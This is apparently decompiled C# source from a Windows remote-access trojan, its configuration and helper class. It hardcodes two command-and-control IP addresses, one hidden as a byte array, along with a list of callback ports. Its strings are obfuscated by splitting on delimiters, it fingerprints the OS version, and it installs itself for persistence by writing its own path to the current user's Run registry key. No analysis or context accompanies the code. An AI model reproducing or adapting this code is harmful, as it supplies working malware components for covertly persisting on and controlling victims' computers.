using System;
using System.IO;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ntharprmes;

internal static class CEAZRNF
{
	public static byte[] ntharprmesvpsips = new byte[13]
	{
		54, 52, 46, 49, 56, 56, 46, 50, 53, 46,
		50, 51, 50
	};

	public static string ntharprmesdefaultP = "212.113.214.154|ntharprmes".Split(new char[1] { '|' })[0];

	public static string ntharprmesmainApp = Path.GetFileNameWithoutExtension(Application.get_ExecutablePath().ToString());

	public static int[] ports = new int[5] { 3263, 4928, 5861, 6814, 8611 };

	public static int ntharprmesport;

	public static string ithgaravaappPath = Application.get_ExecutablePath().ToString();

	public static string ntharprmespc_id = "dhcroi|ntharprmes".Split(new char[1] { '|' })[0];

	public static string ntharprmesremvUser = "mourmnth|ntharprmes".Split(new char[1] { '|' })[0];

	public static string ntharprmesfilesLogs = "bholisd".Split(new char[1] { '|' })[0];

	public static string ntharprmesAppPath = "";

	public static byte[] getByteArray(string value)
	{
		MemoryStream memoryStream = new MemoryStream();
		TextWriter textWriter = new StreamWriter(memoryStream);
		textWriter.Write(value);
		textWriter.Flush();
		memoryStream.Flush();
		return memoryStream.ToArray();
	}

	public static string ntharprmesOsname()
	{
		try
		{
			OperatingSystem oSVersion = Environment.OSVersion;
			return oSVersion.Version.Major + ">" + oSVersion.Version.Minor;
		}
		catch
		{
			return "6>1!ntharprmes".Split(new char[1] { '!' })[0];
		}
	}

	public static void ntharprmesset_run(string app, string path)
	{
		try
		{
			string name = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run|ntharprmes".Split(new char[1] { '|' })[0];
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(name, writable: true);
			string text = ntharprmespc_id;
			object value = registryKey.GetValue(text + app);
			if (value == null)
			{
				registryKey.SetValue(text + app, path);
			}
		}
		catch
		{
		}
	}

	public static string ntharprmesget_mpath()
	{
		return Path.GetDirectoryName(ithgaravaappPath) + "\\";
	}
}
